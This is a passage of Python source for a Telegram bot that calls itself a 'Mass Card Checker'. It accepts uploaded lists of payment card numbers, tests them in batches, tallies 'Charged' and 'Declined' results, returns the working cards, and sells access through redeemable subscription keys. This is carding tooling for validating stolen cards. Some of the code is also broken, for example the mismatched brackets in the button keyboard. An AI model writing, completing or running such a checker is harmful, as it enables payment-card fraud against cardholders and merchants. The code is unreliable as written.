                    text=f"🔍 Checking Cards...\n━━━━━━━━━━━━━━━━━━━━━━\n[🎖] Bot: @FN_B3_AUTH",
                    reply_markup=reply_markup
                )
            except Exception as e:
                logger.warning(f"Failed to update status message for user {user_id}: {str(e)}")

        if cards and not checking_tasks[user_id]['stop']:
            logger.info(f"User {user_id} waiting {TIMEOUT_SECONDS}s before next batch")
            try:
                await context.bot.edit_message_text(
                    chat_id=update.effective_chat.id,
                    message_id=status_msg_id,
                    text=f"🔍 Waiting {TIMEOUT_SECONDS}s before next batch...\n━━━━━━━━━━━━━━━━━━━━━━\n[🎖] Bot: @FN_B3_AUTH",
                    reply_markup=reply_markup
                )
            except Exception as e:
                logger.warning(f"Failed to update timeout message for user {user_id}: {str(e)}")
            await asyncio.sleep(TIMEOUT_SECONDS)

    elapsed = time.time() - start_time
    result_text = f"Checking Completed!\n\nTotal: {total}\nCharged🔥: {charged}\nDeclined❌: {declined}\nTime Taken: {elapsed:.2f}s"
    if charged_cards:
        result_text += "\n\nCharged Cards:\n" + "\n".join(charged_cards)
    try:
        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=status_msg_id,
            text=result_text,
            reply_markup=None
        )
    except Exception as e:
        logger.warning(f"Failed to send completion message for user {user_id}: {str(e)}")
    logger.info(f"User {user_id} completed batch processing: {charged} charged, {declined} declined, {total} total")
    if user_id in checking_tasks:
        del checking_tasks[user_id]

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        has_subscription, tier, _ = check_subscription(user_id)
        if not has_subscription:
            await update.message.reply_text("You need a valid active subscription to use this bot. Use /redeem {key} to activate.")
            logger.warning(f"User {user_id} attempted to upload file without a subscription")
            return
    if update.message.document and update.message.document.file_name.endswith('.txt'):
        file = await update.message.document.get_file()
        try:
            file_content = await file.download_as_bytearray()
            cards = [line.strip() for line in file_content.decode('utf-8').splitlines() if line.strip()]
        except Exception as e:
            logger.error(f"Failed to read file for user {user_id}: {str(e)}")
            await update.message.reply_text("Failed to read file: {str(e)}")
            return

        total = len(cards)
        if user_id != OWNER_ID and total > TIER_LIMITS[tier]:
            await update.message.reply_text(f"Your {tier} subscription allows only {TIER_LIMITS[tier]} cards per file.")
            logger.warning(f"User {user_id} exceeded {tier} limit with {total} cards")
            return

        if user_id in checking_tasks:
            await update.message.reply_text("You already have an active checking process. Please wait or use /stop.")
            logger.warning(f"User {user_id} attempted to start new batch while another is active")
            return

        checking_tasks[user_id] = {'stop': False}
        logger.info(f"User {user_id} started batch processing for {total} cards")

        keyboard = [
            [[InlineKeyboardButton(f"Charged🔥: 0", callback_data='charged')]],
            [InlineKeyboardButton(f"Declined❌: 0", callback_data='declined')],
            [InlineKeyboardButton(f"Total💳: {total}", callback_data='total')])),
            [InlineKeyboardButton(f"Stop🔴", callback_data='stop_batch')],
            [InlineKeyboardButton(f"Response💸: Starting...", callback_data='response')],
        ])
        reply_markup = InlineKeyboardMarkup(keyboard)
        msg = await update.message.reply_text(
            text="🔍 Checking Cards...\n━━━━━━━━━━━━━━━━━━━━━━\n[🎖] Bot: @FN_B3_AUTH",
            reply_markup=reply_markup
        )
        checking_tasks[user_id]['message_id'] = msg.message_id

        asyncio.create_task(process_batch(user_id, cards, update, context, msg.message_id))
    else:
        await update.message.reply_text("Please upload a valid .txt file.")
        logger.warning(f"User {user_id} attempted to upload invalid file type")

async def main():
    logger.info("Starting FN Mass Card Checker Bot")
    try:
        application = Application.builder().token(TOKEN).build()

        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("sh", single_check))
        application.add_handler(CommandHandler("stop", stop_check))
        application.add_handler(CommandHandler("genkey", genkey))
        application.add_handler(CommandHandler("redeem", redeem))
        application.add_handler(CommandHandler("delkey", delkey))
        application.add_handler(CommandHandler("broadcast", broadcast))
        application.add_handler(CallbackQueryHandler(button, pattern='upload_file|cancel_check|help'))
        application.add_handler(CallbackQueryHandler(batch_button, pattern='charged|declined|total|stop_batch|response'))
        application.add_handler(MessageHandler(filters.Document.ALL, handle_file))

        await application.run_polling()
    except Exception as e:
        logger.error(f"Bot startup failed: {str(e)}")
        raise

if __name__ == '__main__':
    asyncio.run(main())